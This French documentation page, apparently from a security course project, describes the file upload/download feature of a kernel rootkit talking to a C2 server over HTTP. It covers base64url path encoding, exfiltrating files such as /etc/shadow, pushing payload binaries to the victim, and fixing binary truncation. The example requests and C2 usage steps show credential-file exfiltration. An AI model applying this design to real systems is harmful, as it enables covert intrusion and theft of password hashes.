---
title: Upload / Download
description: Transfert de fichiers bidirectionnel entre l'attaquant et la victime, implémenté entièrement depuis l'espace noyau sur HTTP.
---

**Optionnel · 3 pts**

Transfert de fichiers bidirectionnel entre l'attaquant et la victime, implémenté entièrement depuis l'espace noyau sur HTTP.

## Contexte

La fonctionnalité upload/download permet à l'attaquant de récupérer n'importe quel fichier de la victime (ex. `/etc/shadow`) et de lui pousser des fichiers arbitraires (ex. un binaire de payload). Tout passe par le canal HTTP existant, sans port ni protocole supplémentaire.

L'implémenter depuis un module noyau a posé deux problèmes difficiles : comment envoyer du **contenu de fichier binaire** via une couche HTTP construite sur des chaînes C, et comment inclure un **chemin de fichier arbitraire** dans une URL sans casser le routage.

## L'approche initiale et ses problèmes

La première implémentation utilisait une route unique `/api/<uuid>/file` pour tous les transferts. Le chemin cible était passé comme en-tête HTTP personnalisé `X-Filename: /etc/shadow`. Deux nouvelles fonctions helpers HTTP ont été écrites depuis zéro dans le module noyau — une pour l'upload, une pour le download — dupliquant du code déjà existant.

**Problème 1 — duplication de code :**

```c
// Deux nouvelles fonctions réimplémentant essentiellement http_get() et http_post()
// juste pour ajouter un en-tête supplémentaire
static int http_get_file(const char *host, const char *uuid, char *out, size_t *out_len);
static int http_post_file(const char *host, const char *uuid,
                          const char *filename, const char *buf, size_t len);
```

**Problème 2 — condition de course :**

```c
// Si deux fichiers sont mis en file rapidement, le rootkit frappe toujours /api/<uuid>/file
// et récupère "le fichier suivant" — selon ce que le serveur décide de retourner.
GET /api/<uuid>/file   ← quel fichier ? dépend de l'état de la file côté serveur
```

## La solution : chemin dans l'URL en base64 URL-safe

L'endpoint a été repensé pour intégrer le chemin directement dans l'URL sous la forme `/api/<uuid>/file/<path>`. Ainsi :

- Les fonctions `http_get()` et `http_post()` existantes peuvent être réutilisées telles quelles — pas de duplication
- Chaque fichier a sa propre URL unique, le rootkit récupère exactement le bon fichier sans ambiguïté
- Les conditions de course disparaissent : deux uploads simultanés ont deux URLs distinctes

Les chemins de fichiers contiennent des `/` qui casseraient le routage URL. Le percent-encoding (`%2F` pour `/`) ne fonctionne pas : Flask décode automatiquement `%2F` en `/` avant le matching de route. Le base64 standard échoue aussi car il utilise `+` (espace dans les URLs) et `/` (séparateur de chemin). Le **base64 URL-safe** remplace les deux par `-` et `_`, produisant une chaîne que Flask route comme un segment opaque unique.

```
/etc/shadow  →  base64url  →  L2V0Yy9zaGFkb3c
/tmp/payload →  base64url  →  L3RtcC9wYXlsb2Fk

// Download : le rootkit POST le contenu du fichier à son URL unique
POST /api/<uuid>/file/L2V0Yy9zaGFkb3c

// Upload : le rootkit GET le fichier mis en attente depuis son URL unique
GET  /api/<uuid>/file/L3RtcC9wYXlsb2Fk
```

:::note[Décodage côté C2]
Flask décode avec `base64.urlsafe_b64decode(path_b64 + '==')`. Le padding `==` est ré-ajouté avant le décodage car le base64 Python standard le requiert, même si on le supprime côté noyau pour garder les URLs propres.
:::

## Problème 3 : contenu binaire et octets NUL

Un problème distinct est apparu lors des tests avec des fichiers binaires. Le helper HTTP POST utilisait originellement `strlen()` pour calculer la longueur du corps. Ça fonctionne pour les payloads texte (stdout, stderr) mais tronque silencieusement les fichiers binaires au premier octet NUL (`0x00`). Un binaire ELF commence par `7f 45 4c 46 00 02…` — il serait envoyé comme un payload de 4 octets.

**Correction :** passer la longueur réelle en octets comme paramètre séparé, et utiliser `Content-Length: <n>` avec la vraie taille au lieu de se fier à `strlen()`.

```c
// Avant (cassé pour les binaires) :
http_post(sock, path, buf, strlen(buf));

// Après (correct) :
http_post(sock, path, buf, actual_len);   // actual_len depuis le stat du fichier
```

## Utilisation

**Download (victime → C2) :**  
Dans le tableau de bord C2, utiliser le modal Action → "Télécharger un fichier", saisir le chemin distant (ex. `/etc/shadow`). Le rootkit lit le fichier et le POST au C2. Le fichier apparaît dans le panneau des transferts avec un lien de sauvegarde.

**Upload (C2 → victime) :**  
Dans le tableau de bord C2, utiliser le modal Action → "Uploader un fichier", sélectionner un fichier local et spécifier le chemin de destination sur la victime. Le C2 met le fichier en attente ; le rootkit le récupère et l'écrit dans le système de fichiers de la victime.
